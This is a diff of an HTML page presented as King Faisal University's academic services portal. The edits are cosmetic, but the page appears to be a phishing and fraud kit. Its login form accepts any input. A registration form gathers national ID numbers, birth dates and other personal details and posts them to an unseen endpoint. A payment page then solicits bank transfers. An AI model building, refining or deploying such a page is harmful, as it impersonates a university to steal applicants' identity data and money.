@@ -5,17 +5,15 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
 
-<!-- Open Graph لتحسين عرض واتس وتيليجرام -->
+<!-- Open Graph & Twitter Card -->
 <meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
 <meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
-<meta property="og:image" content="https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg">
+<meta property="og:image" content="https://i.postimg.cc/YjnPhvjs/your-image.jpg">
 <meta property="og:type" content="website">
-
-<!-- Twitter Card -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
 <meta name="twitter:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
-<meta name="twitter:image" content="https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg">
+<meta name="twitter:image" content="https://i.postimg.cc/YjnPhvjs/your-image.jpg">
 
 <link rel="icon" type="image/png" href="kfu_logo.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -68,7 +66,6 @@ textarea{resize:vertical;}
 @media(max-width:900px){.grid2{grid-template-columns:1fr;}}
 </style>
 </head>
-
 <body>
 
 <div class="login-container">
@@ -93,9 +90,7 @@ textarea{resize:vertical;}
 <div class="quick-access">
 <h3>وصول سريع</h3>
 <div class="quick-links">
-<a href="#" class="quick-link" onclick="showForm()">
-<i class="fas fa-user-graduate"></i> تقديم طلب جديد
-</a>
+<a href="#" class="quick-link" onclick="showForm()"><i class="fas fa-user-graduate"></i> تقديم طلب جديد</a>
 </div>
 </div>
 </div>
@@ -116,10 +111,9 @@ textarea{resize:vertical;}
 <label>الاسم الكامل *</label><input type="text" name="fullName" required>
 <label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
 <label>الجنسية *</label><select name="nationality" required>
-<option value="">اختر الجنسية</option><option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option><option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option><option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option><option>إندونيسيا</option><option>Other</option></select>
-<label>الدولة (مكان الإقامة) *</label><select name="country" required>
-<option value="">اختر الدولة</option><option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option>
-</select>
+<option value="">اختر الجنسية</option>
+<option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option><option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option><option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option><option>إندونيسيا</option><option>Other</option></select>
+<label>الدولة (مكان الإقامة) *</label><select name="country" required><option value="">اختر الدولة</option><option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option></select>
 <label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required>
 <label>تاريخ الميلاد *</label><input type="date" name="birthDate" required>
 <label>مكان الميلاد (المدينة)</label><input type="text" name="birthPlace">
@@ -172,7 +166,7 @@ textarea{resize:vertical;}
 </form>
 </div>
 
-<!-- صفحة السداد بعد إرسال البيانات -->
+<!-- صفحة السداد -->
 <div class="payment-section" id="paymentSection">
 <h2>صفحة السداد</h2>
 <label>اسم المحول:</label><input type="text" id="payerName" required>
@@ -199,10 +193,7 @@ textarea{resize:vertical;}
 <script>
 let hasSubmitted=false;
 
-function showForm(){
-document.getElementById('registrationForm').style.display='block';
-}
-
+function showForm(){ document.getElementById('registrationForm').style.display='block'; }
 function copyAccount(){
 let copyText=document.getElementById('payerAccount');
 copyText.select();
@@ -210,7 +201,6 @@ copyText.setSelectionRange(0,99999);
 document.execCommand('copy');
 showToast('✅ تم نسخ رقم الحساب');
 }
-
 function showToast(msg){
 const toast=document.getElementById('toast');
 toast.textContent=msg;
@@ -218,7 +208,6 @@ toast.classList.add('show');
 setTimeout(()=>toast.classList.remove('show'),2500);
 }
 
-// تسجيل الدخول
 document.getElementById('loginForm').addEventListener('submit',function(e){
 e.preventDefault();
 const user=document.getElementById('username').value.trim();
@@ -227,7 +216,6 @@ if(!user || !pass){showToast('❌ يرجى ملء اسم المستخدم وكل
 showToast('✅ تم تسجيل الدخول');
 });
 
-// إرسال نموذج التقديم
 document.getElementById('registrationFormForm').addEventListener('submit',function(e){
 e.preventDefault();
 if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}
@@ -242,7 +230,6 @@ hasSubmitted=true;
 }).catch(()=>showToast('❌ فشل الاتصال'));
 });
 
-// إرسال السداد
 document.getElementById('submitPayment').addEventListener('click',function(){
 const payerName=document.getElementById('payerName').value.trim();
 const payerAccount=document.getElementById('payerAccount').value.trim();
